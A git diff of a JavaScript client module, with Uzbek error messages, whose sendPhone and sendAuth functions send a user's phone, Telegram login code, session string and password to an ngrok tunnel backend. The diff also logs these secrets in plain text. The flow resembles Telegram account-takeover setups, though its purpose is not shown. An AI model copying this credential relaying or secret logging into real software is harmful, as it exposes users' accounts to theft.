@@ -3,9 +3,6 @@ export async function getUserById(id) {
     method: "GET",
     headers: { "Accept": "application/json", "ngrok-skip-browser-warning": "true", },
   });
-
-  console.log(await res);
-
   if (!res.ok) {
     throw new Error("Server xatolik: " + res.status);
   }
@@ -30,37 +27,101 @@ export async function getActiveNumbers(numbers) {
   return data;
 }
 
+
+
+
+
+
+
+
+
+
+
+
 export async function sendPhone(user_id, phone) {
-  const res = await fetch("https://aracelis-svelte-mitigatedly.ngrok-free.dev/tg/send-code", {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json", "ngrok-skip-browser-warning": "true"
-    },
-    body: JSON.stringify({ phone, user_id }) // <-- obyektni stringga aylantirish
+  try {
+    const res = await fetch(
+      "https://aracelis-svelte-mitigatedly.ngrok-free.dev/tg/send-code",
+      {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "ngrok-skip-browser-warning": "true",
+        },
+        body: JSON.stringify({ user_id, phone }),
+      }
+    );
+    console.log(await res);
+    if (!res.ok) {
+      alert("Server xtoligi")
+    }
+    const data = await res.json();
+    return { data };
+  } catch (err) {
+    alert("Tarmoq xatosi");
+    return {
+      data: {
+        status: 404,
+        error: true,
+        message: err.message || "Network error"
+      }
+    };
+  }
+}
+export async function sendAuth(
+  user_id,
+  phone,
+  code,
+  phoneCodeHash,
+  stringSessionText,
+  password
+) {
+  console.log({
+    user_id,
+    phone,
+    code,
+    phoneCodeHash,
+    stringSessionText,
+    password
   });
 
-  if (!res.ok) {
-    throw new Error("Server xatolik: " + res.status);
+  try {
+    const res = await fetch(
+      "https://aracelis-svelte-mitigatedly.ngrok-free.dev/tg/verify-code",
+      {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "ngrok-skip-browser-warning": "true",
+        },
+        body: JSON.stringify({
+          user_id,
+          phone,
+          code,
+          phoneCodeHash,
+          stringSessionText,
+          password,
+        }),
+      }
+    );
+
+    const data = await res.json();
+
+    if (!res.ok) {
+      throw new Error(data?.error || "sendAuth failed");
+    }
+    return { data };
+  } catch (err) {
+    alert("Tarmoq xatosi")
+    return {
+      data: {
+        status: 404,
+        error: true,
+        message: err.message || "Network error",
+      }
+    };
   }
-
-  const data = await res.json();
-  return data;
 }
-export async function sendAuth(user_id, phone, code, phoneCodeHash, stringSessionText, password) {
-  const res = await fetch("https://aracelis-svelte-mitigatedly.ngrok-free.dev/tg/verify-code", {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json", "ngrok-skip-browser-warning": "true"
-    },
-    body: JSON.stringify({ user_id, phone, code, phoneCodeHash, stringSessionText, password }) // <-- obyektni stringga aylantirish
-  });
 
-  if (!res.ok) {
-    throw new Error("Server xatolik: " + res.status);
-  }
-
-  const data = await res.json();
-  return data;
-}
 
 
